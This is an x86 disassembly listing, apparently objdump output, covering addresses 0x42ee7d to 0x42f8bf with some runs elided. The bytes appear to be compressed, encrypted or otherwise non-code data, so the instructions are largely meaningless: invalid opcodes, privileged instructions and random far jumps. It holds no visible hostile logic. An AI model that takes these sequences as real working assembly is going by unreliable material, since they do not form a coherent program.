  42ee7d:	xchg   edx,eax
  42ee7e:	jb     0x42eea9
  42ee80:	mov    bl,0xba
  42ee82:	call   0x12c3c611
  42ee87:	mov    ebp,0xb0b1e365
  42ee8c:	and    esi,0xffffffaf
  42ee8f:	xchg   esi,eax
  42ee90:	sti    
  42ee91:	imul   esi,edx,0x450fc006
  42ee97:	out    0x39,al
  42ee99:	mul    BYTE PTR [esi]
  42ee9b:	push   ebx
  42ee9c:	test   eax,0xb91acc02
  42eea1:	lea    esi,[eax-0x4d328662]
  42eea7:	sub    ebx,ebx
  42eea9:	add    cl,BYTE PTR [edi+0x0]
  42eeac:	data16 arpl WORD PTR [ebx-0x4a48a081],bx
  42eeb3:	repz rcr bh,cl
  42eeb6:	ja     0x42ee53
  42eeb8:	xchg   DWORD PTR [ebx],ebp
  42eeba:	sti    
  42eebb:	or     DWORD PTR [ebp+0x71],0x4632d4e
  42eec2:	ficom  DWORD PTR [edx+0x31]
  42eec5:	and    al,0x5b
  42eec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eec8:	aad    0x73
  42eeca:	adc    ah,BYTE PTR [esi-0xb]
  42eecd:	push   esp
  42eece:	aas    
  42eecf:	and    al,0x32
  42eed1:	out    dx,al
  42eed2:	mov    dh,BYTE PTR [edx+esi*8+0x2b]
  42eed6:	pop    edx
  42eed7:	(bad)  
  42eed8:	jmp    0xe343:0x82568663
  42eedf:	stos   BYTE PTR es:[edi],al
  42eee0:	inc    eax
  42eee1:	jmp    0x90:0xbe0466d8
  42eee8:	cmp    ebp,DWORD PTR [eax+0x576dfdd7]
	...
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	ins    DWORD PTR es:[edi],dx
  42ef63:	sub    dl,cl
  42ef65:	add    DWORD PTR [edi-0x9],esp
  42ef68:	add    DWORD PTR [eax],eax
  42ef6a:	add    BYTE PTR [ecx],al
  42ef6c:	add    BYTE PTR [eax],al
  42ef6e:	push   edx
  42ef6f:	inc    edx
  42ef70:	mov    al,ds:0x7601f63a
  42ef75:	out    0xcc,al
  42ef77:	push   ss
  42ef78:	mov    ds:0x975faf24,eax
  42ef7d:	or     eax,0xfc2c6370
  42ef82:	pop    es
  42ef83:	les    esi,FWORD PTR [ebx-0x71380f14]
  42ef89:	mov    al,0x80
  42ef8b:	push   edx
  42ef8c:	push   0x33
  42ef8e:	add    DWORD PTR [edi-0x65],0xed0e620
  42ef95:	enter  0x573c,0xee
  42ef99:	sbb    edi,ebx
  42ef9b:	fild   WORD PTR [edi+0x7f20c8d1]
  42efa1:	fsubr  QWORD PTR ds:0xf39f1074
  42efa7:	cli    
  42efa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efa9:	dec    edx
  42efaa:	mov    WORD PTR [edx-0x1],fs
  42efad:	mov    edx,0x98da65f1
  42efb2:	fld    QWORD PTR [esi+edi*8]
  42efb5:	push   ds
  42efb6:	mov    esp,0xbe654fce
  42efbb:	pop    edx
  42efbc:	test   eax,0x8ba66f8a
  42efc1:	jno    0x42ef45
  42efc3:	and    DWORD PTR [ebp+0x687ecef7],0xffffffba
  42efca:	add    eax,0x1eff1103
  42efcf:	fdivr  DWORD PTR [ecx+0x7b]
  42efd2:	jmp    0x21c8:0xf5b05d96
  42efd9:	jne    0x42efd9
  42efdb:	push   ebp
  42efdc:	and    eax,0x6ae8bb49
  42efe1:	ins    BYTE PTR es:[edi],dx
  42efe2:	jmp    0x42ef7c
  42efe4:	into   
  42efe5:	dec    edi
  42efe6:	std    
  42efe7:	sahf   
  42efe8:	push   esi
  42efe9:	wbinvd 
  42efeb:	pmullw mm7,QWORD PTR [ebx-0x2]
  42efef:	lea    ebp,[edi-0x2a]
  42eff2:	aam    0x18
  42eff4:	lock xchg edx,eax
  42eff6:	mov    al,0x6
  42eff8:	dec    esi
  42eff9:	ds iret 
  42effb:	lods   eax,DWORD PTR ds:[esi]
  42effc:	mov    ebp,0xb5b0ca60
  42f001:	xor    eax,0xbdad29a7
  42f006:	pop    ds
  42f007:	neg    esp
  42f009:	pop    es
  42f00a:	cmc    
  42f00b:	call   0xb5432127
  42f010:	jbe    0x42f029
  42f012:	pop    edi
  42f013:	adc    DWORD PTR [eax+edi*1+0x12d16a7],edx
  42f01a:	shl    ebx,cl
  42f01c:	mov    al,ds:0x30d62942
  42f021:	pop    esp
  42f022:	xor    BYTE PTR [esi-0x24],0xa5
  42f026:	aas    
  42f027:	mov    edi,0xdcfd6fe7
  42f02c:	repnz call 0x6dd0:0xe9263b5d
  42f034:	aad    0x8a
  42f036:	jg     0x42efd7
  42f038:	mov    al,0xf8
  42f03a:	fisubr WORD PTR [esi+0x1250bd2a]
  42f040:	mov    al,ds:0x7dbf34c6
  42f045:	retf   
  42f046:	cmp    DWORD PTR ss:[edx-0x166c540],esi
  42f04d:	push   0xffffffce
  42f04f:	pop    esi
  42f050:	lahf   
  42f051:	jbe    0x42f051
  42f053:	inc    esi
  42f054:	jmp    0x42f0a0
  42f056:	inc    esi
  42f057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f058:	data16 in al,dx
  42f05a:	scas   al,BYTE PTR es:[edi]
  42f05b:	rol    BYTE PTR [edi],1
  42f05d:	adc    BYTE PTR [eax],dl
  42f05f:	lods   al,BYTE PTR ds:[esi]
  42f060:	rcl    BYTE PTR [edi],1
  42f062:	and    eax,0x4a560d1b
  42f067:	cld    
  42f068:	repnz sbb DWORD PTR [esi-0x18],0x28d
	...
  42f0d4:	add    BYTE PTR [eax],al
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	sahf   
  42f0e3:	std    
  42f0e4:	xor    ch,ch
  42f0e6:	addr16 clc 
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	hlt    
  42f0ef:	les    edx,FWORD PTR [ecx+edi*1+0x45880566]
  42f0f6:	(bad)  
  42f0f7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42f0f9:	push   ss
  42f0fa:	ret    
  42f0fb:	sub    ebp,0xcbde8a71
  42f101:	mov    ds:0xdd90fbfb,al
  42f106:	pop    eax
  42f107:	inc    ecx
  42f108:	add    eax,DWORD PTR [edi+0x38]
  42f10b:	shr    DWORD PTR [edi+0x44004c29],0xb0
  42f112:	xchg   edi,eax
  42f113:	cmp    dl,BYTE PTR [eax]
  42f115:	popa   
  42f116:	or     BYTE PTR [ecx-0x10],al
  42f119:	scas   eax,DWORD PTR es:[edi]
  42f11a:	sbb    edx,DWORD PTR [ecx+0x361d43b4]
  42f120:	daa    
  42f121:	aad    0x6
  42f123:	mov    al,0x36
  42f125:	out    dx,eax
  42f126:	xchg   esi,eax
  42f127:	outs   dx,DWORD PTR ds:[esi]
  42f128:	or     eax,0x4e47d2c7
  42f12d:	fdivr  QWORD PTR [ebp+0x6d94b2bb]
  42f133:	test   al,al
  42f135:	popf   
  42f136:	aaa    
  42f137:	adc    bl,cl
  42f139:	pop    ebx
  42f13a:	sbb    ecx,edi
  42f13c:	pop    esi
  42f13d:	mov    bl,0xe2
  42f13f:	enter  0x662d,0xc2
  42f143:	lds    esi,FWORD PTR [ecx-0x4dd1f470]
  42f149:	dec    edi
  42f14a:	rcr    BYTE PTR [ebp+0x50],cl
  42f14d:	cs hlt 
  42f14f:	push   0x8865a330
  42f154:	cmp    DWORD PTR [eax-0x7b812723],0x7cdaf3de
  42f15e:	rcr    DWORD PTR [edi+0x7a],cl
  42f161:	push   0xea0c116f
  42f166:	rcl    DWORD PTR [eax],1
  42f168:	in     eax,0x4a
  42f16a:	xchg   esi,eax
  42f16b:	jle    0x42f1b5
  42f16d:	aam    0xa8
  42f16f:	mov    ds:0x2d761446,eax
  42f174:	xchg   BYTE PTR ds:0x5d745020,al
  42f17a:	pop    eax
  42f17b:	je     0x42f122
  42f17d:	pop    ss
  42f17e:	inc    edx
  42f17f:	dec    esi
  42f180:	rcl    BYTE PTR [ecx+0x6e],1
  42f183:	cmc    
  42f184:	outs   dx,DWORD PTR ds:[esi]
  42f185:	addr16 aam 0xb3
  42f188:	loopne 0x42f1e3
  42f18a:	mov    ds:0x64173a54,al
  42f18f:	and    bh,dl
  42f191:	repnz sbb al,BYTE PTR [eax+ebx*2]
  42f195:	int    0x2d
  42f197:	call   0x18953a37
  42f19c:	addr16 push ss
  42f19e:	sub    al,0xf2
  42f1a0:	repz jge 0x42f158
  42f1a3:	cmp    eax,0x673b35e7
  42f1a8:	loopne 0x42f151
  42f1aa:	adc    al,0x79
  42f1ac:	fldz   
  42f1ae:	mov    dl,0xbb
  42f1b0:	and    dl,ch
  42f1b2:	jg     0x42f17f
  42f1b4:	jg     0x42f19e
  42f1b6:	xor    bl,BYTE PTR [esi+0x27589d39]
  42f1bc:	push   esp
  42f1bd:	mov    bl,0xc3
  42f1bf:	jmp    0xa7c57dee
  42f1c4:	pushf  
  42f1c5:	and    bh,BYTE PTR [ebx+0x33f5274b]
  42f1cb:	int3   
  42f1cc:	mov    bl,0xb5
  42f1ce:	pop    ecx
  42f1cf:	mov    edx,0x29f9d8e1
  42f1d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1d5:	mov    cl,0x9b
  42f1d7:	inc    BYTE PTR [ecx]
  42f1d9:	sahf   
  42f1da:	rcl    al,cl
  42f1dc:	xor    BYTE PTR [esi-0x1c],bl
  42f1df:	jbe    0x42f23c
  42f1e1:	call   0xb05605cc
  42f1e6:	or     eax,0x4e80ebb0
  42f1eb:	jae    0x42f25d
  42f1ed:	inc    ebx
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	int3   
  42f263:	adc    BYTE PTR [edx],ch
  42f265:	cmp    eax,0x1f967
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	sbb    DWORD PTR [eax],ebp
  42f270:	cmp    bl,BYTE PTR [edx]
  42f272:	(bad)  
  42f273:	out    dx,al
  42f274:	sti    
  42f275:	lods   eax,DWORD PTR ds:[esi]
  42f276:	shl    ecx,0xbe
  42f279:	daa    
  42f27a:	pop    ss
  42f27b:	(bad)  
  42f27c:	out    dx,al
  42f27d:	xchg   ebp,eax
  42f27e:	icebp  
  42f27f:	repnz (bad) 
  42f281:	(bad)  
  42f284:	cmp    al,BYTE PTR [eax]
  42f286:	xchg   ebp,eax
  42f287:	add    eax,0x3aa4a6c0
  42f28c:	mov    esp,0x4a493349
  42f291:	and    eax,0x181dd2ba
  42f296:	(bad)  
  42f297:	ret    
  42f298:	lods   eax,DWORD PTR ds:[esi]
  42f299:	xchg   edx,eax
  42f29a:	mov    ds:0x2dc990e3,al
  42f29f:	mov    ecx,0xbe0858e3
  42f2a4:	stos   DWORD PTR es:[edi],eax
  42f2a5:	xchg   ebp,eax
  42f2a6:	or     esi,eax
  42f2a8:	ja     0x42f308
  42f2aa:	(bad)  
  42f2ac:	ss dec esp
  42f2ae:	mov    bh,0xa9
  42f2b0:	jne    0x42f2c9
  42f2b2:	(bad)  
  42f2b3:	sub    al,0x54
  42f2b5:	xchg   edx,eax
  42f2b6:	mov    edx,edi
  42f2b8:	dec    edi
  42f2b9:	test   eax,0x51e9c32c
  42f2be:	shl    BYTE PTR [eax],0xc4
  42f2c1:	sbb    eax,0x61e8ac31
  42f2c6:	pop    edi
  42f2c7:	sbb    eax,0xb2a72454
  42f2cc:	mul    edx
  42f2ce:	stos   DWORD PTR es:[edi],eax
  42f2cf:	mov    bl,0x54
  42f2d1:	mov    ebp,0xbb6f288f
  42f2d6:	fyl2xp1 
  42f2d8:	adc    eax,0x6361b845
  42f2dd:	(bad)  
  42f2de:	shr    BYTE PTR [ebp+0x4e],1
  42f2e1:	fisttp QWORD PTR [ecx+ebx*2+0x94528e0]
  42f2e8:	inc    ecx
  42f2e9:	add    BYTE PTR [edi],dh
  42f2eb:	fiadd  DWORD PTR [edx-0x177585ec]
  42f2f1:	loopne 0x42f36a
  42f2f3:	push   esi
  42f2f4:	sub    BYTE PTR [edx-0x3f],ah
  42f2f7:	xchg   DWORD PTR [ecx+0x44c9fb05],edx
  42f2fd:	fsubr  DWORD PTR [edi-0x10]
  42f300:	loope  0x42f35e
  42f302:	out    dx,al
  42f303:	aas    
  42f304:	inc    edx
  42f305:	push   cs
  42f306:	xlat   BYTE PTR ds:[ebx]
  42f307:	addr16 je 0x42f37a
  42f30a:	cmp    DWORD PTR fs:[ebp+0x15],edx
  42f30e:	cmp    DWORD PTR [edi+0x196663e5],edi
  42f314:	cli    
  42f315:	mov    dl,0x32
  42f317:	fsubr  DWORD PTR [esi]
  42f319:	xchg   ebp,eax
  42f31a:	cmc    
  42f31b:	xchg   ebp,eax
  42f31c:	pop    ss
  42f31d:	and    dh,BYTE PTR [eax]
  42f31f:	ficomp DWORD PTR [ebx-0x19ac2183]
  42f325:	fisub  DWORD PTR [esi+0x7e0b5af2]
  42f32b:	pop    edi
  42f32c:	arpl   dx,si
  42f32e:	mov    ds:0xd8c98001,eax
  42f333:	sbb    DWORD PTR [esi-0x683bc38],edi
  42f339:	and    BYTE PTR [ebx-0x42],cl
  42f33c:	dec    ebx
  42f33d:	jno    0x42f326
  42f33f:	xchg   ecx,eax
  42f340:	dec    esi
  42f341:	cmp    ecx,DWORD PTR [ecx-0x5dc4ce9f]
  42f347:	sbb    edx,esi
  42f349:	cmp    bl,al
  42f34b:	pop    edi
  42f34c:	inc    edx
  42f34d:	mov    ds:0xb937d02,al
  42f352:	mov    cl,BYTE PTR [ebx-0x48598b17]
  42f358:	(bad)  
  42f359:	es cwde 
  42f35b:	inc    esp
  42f35c:	pushf  
  42f35d:	inc    ebx
  42f35e:	retf   0xc5a2
  42f361:	das    
  42f362:	fst    DWORD PTR [eax-0x1d]
  42f365:	add    ebx,DWORD PTR [eax+ebp*8+0x11]
  42f369:	cmc    
  42f36a:	xchg   esp,eax
  42f36b:	and    esi,edi
  42f36d:	out    dx,al
	...
  42f3d6:	mov    ebp,0xaf8a081a
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	ja     0x42f40d
  42f3e4:	rcl    BYTE PTR [esi],1
  42f3e6:	addr16 cli 
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	clc    
  42f3ef:	xor    cl,0x7e
  42f3f2:	mov    WORD PTR [edi],?
  42f3f4:	pop    esp
  42f3f5:	daa    
  42f3f6:	push   esp
  42f3f7:	xor    bl,BYTE PTR [ebx]
  42f3f9:	sahf   
  42f3fa:	sti    
  42f3fb:	pop    ds
  42f3fc:	test   esi,0xc73ad6c3
  42f402:	xor    al,0xca
  42f404:	ss lock (bad) 
  42f408:	and    al,0xca
  42f40a:	and    dh,BYTE PTR [edi-0x4e]
  42f40d:	xor    edi,edx
  42f40f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f410:	adc    DWORD PTR [edi+0x30],ebx
  42f413:	retf   
  42f414:	xchg   ebx,eax
  42f415:	xor    eax,0xb8bfdbe5
  42f41a:	sahf   
  42f41b:	jnp    0x42f3c4
  42f41d:	pushf  
  42f41e:	(bad)  
  42f420:	data16 loope 0x42f419
  42f423:	rcl    cl,1
  42f425:	add    DWORD PTR [eax-0x54f3511d],ebx
  42f42b:	jnp    0x42f3d5
  42f42d:	popf   
  42f42e:	ret    
  42f42f:	shr    BYTE PTR [edx+0x75],1
  42f432:	and    BYTE PTR [esi-0x4d066947],ch
  42f438:	inc    ecx
  42f439:	cwde   
  42f43a:	loope  0x42f3e1
  42f43c:	dec    ebp
  42f43d:	sub    eax,0x232cb188
  42f442:	add    eax,0x1289736d
  42f447:	dec    esi
  42f448:	lock mov ebp,0x1b36c9dc
  42f44e:	addr16 cmp ch,cl
  42f451:	jg     0x42f4ce
  42f453:	scas   eax,DWORD PTR es:[edi]
  42f454:	mov    DWORD PTR [esi+ebp*8],esi
  42f457:	push   cs
  42f458:	into   
  42f459:	mov    esp,0x86312320
  42f45e:	push   edx
  42f45f:	leave  
  42f460:	and    eax,0x8e778a2e
  42f465:	jge    0x42f41d
  42f467:	cdq    
  42f468:	js     0x42f479
  42f46a:	mov    eax,0x3d3851fe
  42f46f:	mov    al,0x40
  42f471:	pusha  
  42f472:	add    ah,BYTE PTR [ebx+0x20]
  42f475:	and    eax,0xee065dd0
  42f47a:	jo     0x42f422
  42f47c:	jae    0x42f4cf
  42f47e:	inc    ebp
  42f47f:	mov    ebx,0xd45f87be
  42f484:	bnd jg 0x42f427
  42f487:	imul   esi
  42f489:	hlt    
  42f48a:	gs repnz fwait
  42f48d:	mov    DWORD PTR es:[eax],ecx
  42f490:	aam    0xdd
  42f492:	test   DWORD PTR [eax+0x21d42c8b],esp
  42f498:	xchg   ebx,eax
  42f499:	mov    al,ds:0x6be2503f
  42f49e:	xor    cl,BYTE PTR [esi]
  42f4a0:	test   DWORD PTR [edi],esi
  42f4a2:	lahf   
  42f4a3:	fwait
  42f4a4:	push   0x13
  42f4a6:	mov    edx,0x849601a7
  42f4ab:	out    dx,eax
  42f4ac:	mov    cl,0xe2
  42f4ae:	aam    0xda
  42f4b0:	xchg   DWORD PTR [edi+0x4b],edi
  42f4b3:	int3   
  42f4b4:	and    eax,0xd895411
  42f4b9:	mov    ds,WORD PTR [ecx+0x170261bf]
  42f4bf:	ds cmp eax,0x20d77f64
  42f4c5:	js     0x42f4f3
  42f4c7:	pop    edx
  42f4c8:	mov    esi,DWORD PTR [ecx+0x12]
  42f4cb:	test   ebx,eax
  42f4cd:	push   ds
  42f4ce:	and    cl,ch
  42f4d0:	adc    bl,BYTE PTR [ecx+esi*1+0x46]
  42f4d4:	xchg   ebx,eax
  42f4d5:	bound  ecx,QWORD PTR [ebx-0x2d]
  42f4d8:	dec    ebx
  42f4d9:	sbb    BYTE PTR [ebx+0x1515f15],0xac
  42f4e0:	jp     0x42f551
  42f4e2:	add    DWORD PTR [ecx+0x7e],ebx
  42f4e5:	adc    esp,eax
  42f4e7:	cmp    eax,0x6bf48136
  42f4ec:	xlat   BYTE PTR ds:[ebx]
  42f4ed:	mov    cl,0x0
	...
  42f553:	add    BYTE PTR [eax],al
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	push   es
  42f563:	in     eax,dx
  42f564:	mov    ebx,0x1fb670f
  42f569:	add    BYTE PTR [eax],al
  42f56b:	add    DWORD PTR [eax],eax
  42f56d:	add    al,dh
  42f56f:	outs   dx,DWORD PTR ds:[esi]
  42f570:	pop    es
  42f571:	(bad)  
  42f573:	aad    0xd5
  42f575:	pop    ecx
  42f576:	sbb    BYTE PTR [edx-0x68],al
  42f579:	(bad)  
  42f57a:	out    0x25,al
  42f57c:	out    dx,al
  42f57d:	into   
  42f57e:	pop    esi
  42f57f:	stos   DWORD PTR es:[edi],eax
  42f580:	cs xchg edx,eax
  42f582:	mov    bh,0x64
  42f584:	dec    ecx
  42f585:	in     eax,0x7f
  42f587:	cmc    
  42f588:	loope  0x42f604
  42f58a:	cs int3 
  42f58c:	enter  0xa223,0x7e
  42f590:	mov    bh,0xe4
  42f592:	lea    esi,[edx]
  42f594:	ja     0x42f55b
  42f596:	sub    ch,BYTE PTR [edi-0x413144d2]
  42f59c:	dec    eax
  42f59d:	fld    st(2)
  42f59f:	sar    dh,cl
  42f5a1:	jmp    0x42f5b4
  42f5a3:	cld    
  42f5a4:	int3   
  42f5a5:	mov    BYTE PTR [esi],cl
  42f5a7:	mov    esi,0x7219886b
  42f5ac:	and    BYTE PTR [esi],ah
  42f5ae:	lahf   
  42f5af:	mov    eax,0x9c9c8e49
  42f5b4:	sbb    edx,ecx
  42f5b6:	(bad)  
  42f5b7:	bound  ebp,QWORD PTR [edx-0x71]
  42f5ba:	cdq    
  42f5bb:	cmc    
  42f5bc:	mov    BYTE PTR [edx-0x16],ah
  42f5bf:	into   
  42f5c0:	adc    BYTE PTR [ecx-0x7],al
  42f5c3:	jle    0x42f55c
  42f5c5:	dec    esp
  42f5c6:	and    DWORD PTR [ebx],ecx
  42f5c8:	clc    
  42f5c9:	fwait
  42f5ca:	ja     0x42f5d5
  42f5cc:	pop    esi
  42f5cd:	push   edx
  42f5ce:	cmp    eax,0xdb533bb6
  42f5d3:	mov    BYTE PTR [ebp+0xf75ca57],cl
  42f5d9:	mov    esp,ebx
  42f5db:	rcr    BYTE PTR [esi],1
  42f5dd:	dec    ebx
  42f5de:	iret   
  42f5df:	call   0x79a1:0x21be4209
  42f5e6:	shl    cl,1
  42f5e8:	jb     0x42f659
  42f5ea:	and    ch,BYTE PTR [eax+ecx*4]
  42f5ed:	popf   
  42f5ee:	mov    al,0xf4
  42f5f0:	cmp    ah,BYTE PTR [edx-0x5a4565d8]
  42f5f6:	add    al,0xa
  42f5f8:	test   eax,0x68f2a3bb
  42f5fd:	add    eax,0x9e9c0230
  42f602:	mov    esp,0x6843a2ab
  42f607:	mov    es,WORD PTR [edx]
  42f609:	mov    eax,ds:0x6119c58a
  42f60e:	jge    0x42f603
  42f610:	sub    cl,bh
  42f612:	mov    ch,0xdf
  42f614:	mov    ds:0x101024cd,eax
  42f619:	pop    ss
  42f61a:	fisttp WORD PTR [ebp-0x510acc35]
  42f620:	sub    DWORD PTR [ecx],edi
  42f622:	repz mov ds,edi
  42f625:	adc    BYTE PTR [ecx-0x5a],dh
  42f628:	cmp    esp,DWORD PTR [ebp-0x3b]
  42f62b:	in     eax,dx
  42f62c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f62d:	cmp    al,BYTE PTR [edi+0x49]
  42f630:	adc    eax,0x23399dc6
  42f635:	aas    
  42f636:	das    
  42f637:	jle    0x42f65d
  42f639:	xchg   edx,eax
  42f63a:	aaa    
  42f63b:	push   edi
  42f63c:	or     DWORD PTR [edx+0xc],0x78b192ef
  42f643:	add    BYTE PTR [edi+0x1f],dl
  42f646:	add    eax,DWORD PTR [ebp+0x6aeb2757]
  42f64c:	inc    ecx
  42f64d:	lods   eax,DWORD PTR ds:[esi]
  42f64e:	iret   
  42f64f:	shr    DWORD PTR [edi+0x0],cl
  42f652:	cmp    BYTE PTR [edi],0x2c
  42f655:	clc    
  42f656:	inc    ebp
  42f657:	push   eax
  42f658:	sbb    al,dh
  42f65a:	leave  
  42f65b:	mov    bh,0xc6
  42f65d:	pop    ebx
  42f65e:	sahf   
  42f65f:	push   esp
  42f660:	inc    esi
  42f661:	fimul  WORD PTR [ebx-0x532950b2]
  42f667:	sbb    dl,BYTE PTR [eax+0x3cb63194]
  42f66d:	lds    eax,FWORD PTR [eax]
	...
  42f6d3:	add    BYTE PTR [eax],al
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	mov    edi,0x67608a44
  42f6e7:	cld    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	dec    esp
  42f6ef:	imul   ecx,edi,0xffffffcd
  42f6f2:	inc    ebx
  42f6f3:	pop    esp
  42f6f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6f5:	pop    ebp
  42f6f6:	bound  eax,QWORD PTR [eax+eiz*2-0x753b6892]
  42f6fd:	mov    edx,0x73f183ff
  42f702:	push   0x899bd630
  42f707:	aaa    
  42f708:	in     al,dx
  42f709:	mov    WORD PTR [edx],?
  42f70b:	mov    ?,WORD PTR [edi]
  42f70d:	int3   
  42f70e:	into   
  42f70f:	push   0x6ee149ee
  42f714:	push   ebx
  42f715:	xchg   ecx,eax
  42f716:	pop    ebp
  42f717:	inc    eax
  42f718:	fild   WORD PTR [ebp-0x4]
  42f71b:	jge    0x42f6b6
  42f71d:	xlat   BYTE PTR ds:[ebx]
  42f71e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f71f:	xchg   edi,eax
  42f720:	out    dx,eax
  42f721:	mov    ah,0x8
  42f723:	sbb    BYTE PTR [ebx-0x64],0xa8
  42f727:	mov    bl,0x19
  42f729:	lea    ebp,[eax*1-0x6e7bad02]
  42f730:	fsubr  DWORD PTR [edx]
  42f732:	mov    dl,0xd9
  42f734:	out    0xf3,al
  42f736:	jge    0x42f760
  42f738:	mov    ecx,0x9f609b4e
  42f73d:	xchg   esi,eax
  42f73e:	fcomp  DWORD PTR [ebp-0xc36e358]
  42f744:	loop   0x42f6f0
  42f746:	mov    ebx,0xe0041909
  42f74b:	jl     0x42f6de
  42f74d:	loope  0x42f6ec
  42f74f:	gs (bad) 
  42f751:	jnp    0x42f72a
  42f753:	push   ebp
  42f754:	sub    BYTE PTR [ebp+ecx*2+0xb],cl
  42f758:	xor    eax,0x68a1287e
  42f75d:	test   eax,0x1f4aa02e
  42f762:	iret   
  42f763:	and    bl,BYTE PTR [edi+0x173dc01d]
  42f769:	daa    
  42f76a:	push   esi
  42f76b:	loope  0x42f6f3
  42f76d:	test   DWORD PTR [esi+edx*8+0x1c6b1d6d],ebx
  42f774:	push   eax
  42f775:	fxch   st(6)
  42f777:	stos   BYTE PTR es:[edi],al
  42f778:	nop
  42f779:	pop    esi
  42f77a:	lock stos DWORD PTR es:[edi],eax
  42f77c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f77d:	rcr    DWORD PTR [esi],cl
  42f77f:	dec    ebp
  42f781:	mov    ch,BYTE PTR [esi]
  42f783:	shl    ecx,cl
  42f785:	pop    edi
  42f786:	cdq    
  42f787:	test   BYTE PTR [ebx+ecx*2-0x6b],ch
  42f78b:	inc    esp
  42f78c:	ss pushf 
  42f78e:	enter  0xbec9,0xe0
  42f792:	dec    esi
  42f793:	pop    eax
  42f794:	sub    al,0x66
  42f796:	adc    eax,0x50b57a0
  42f79b:	xchg   BYTE PTR [esi],bl
  42f79d:	test   eax,0xecfd6211
  42f7a2:	or     dl,bh
  42f7a4:	dec    eax
  42f7a5:	fcmovb st,st(4)
  42f7a7:	cmp    DWORD PTR [edi-0x30986c4],ebx
  42f7ad:	imul   esi,ecx,0xaf2c0e9b
  42f7b3:	adc    BYTE PTR [ebx-0x9cbc89b],bh
  42f7b9:	dec    ecx
  42f7ba:	rcr    DWORD PTR [esi],1
  42f7bc:	test   al,0x1e
  42f7be:	xchg   edx,eax
  42f7bf:	dec    esi
  42f7c0:	cmc    
  42f7c1:	lahf   
  42f7c2:	sub    BYTE PTR [edx-0xa1dd670],dh
  42f7c8:	and    al,0xc4
  42f7ca:	sub    ah,BYTE PTR [eax]
  42f7cc:	or     DWORD PTR [ecx],esp
  42f7ce:	xchg   ecx,eax
  42f7cf:	xor    eax,0x58107d7e
  42f7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f7d5:	mov    eax,0x102210d9
  42f7da:	jne    0x42f7de
  42f7dc:	xchg   edx,eax
  42f7dd:	popa   
  42f7de:	push   cs
  42f7df:	(bad)  
  42f7e0:	pop    esp
  42f7e1:	out    0x80,al
  42f7e3:	jbe    0x42f7a8
  42f7e5:	fwait
  42f7e6:	rcr    BYTE PTR [edx+edx*1+0x64d6c52f],cl
  42f7ed:	mov    esi,0x0
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xfe78e875
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	int3   
  42f86f:	and    al,0x55
  42f871:	test   al,0xac
  42f873:	mov    edi,0x347e0447
  42f878:	pop    esp
  42f879:	push   esp
  42f87a:	add    eax,0xe6c42d66
  42f87f:	add    esp,DWORD PTR [ecx+0x53]
  42f882:	in     al,0x6b
  42f884:	in     eax,0xe8
  42f886:	rcl    DWORD PTR [edi+edi*4+0xe29e443],cl
  42f88d:	retf   0x2ba1
  42f890:	adc    dl,cl
  42f892:	int    0x68
  42f894:	retf   
  42f895:	clc    
  42f896:	add    esi,ebx
  42f898:	pop    ss
  42f899:	adc    edi,DWORD PTR [ebx-0x7b]
  42f89c:	or     BYTE PTR [ecx-0xada7c79],0xfa
  42f8a3:	pop    edi
  42f8a4:	jae    0x42f8e7
  42f8a6:	out    dx,al
  42f8a7:	inc    ebx
  42f8a8:	pop    ds
  42f8a9:	inc    esp
  42f8aa:	pop    ss
  42f8ab:	mov    bl,0x30
  42f8ad:	je     0x42f8c7
  42f8af:	push   0x6337e7f7
  42f8b4:	cmovp  ebp,DWORD PTR [ecx+0x11]
  42f8b8:	mov    esp,0x161c163e
  42f8bd:	shl    bl,1
  42f8bf:	cmp    eax,0x38f8b8dd
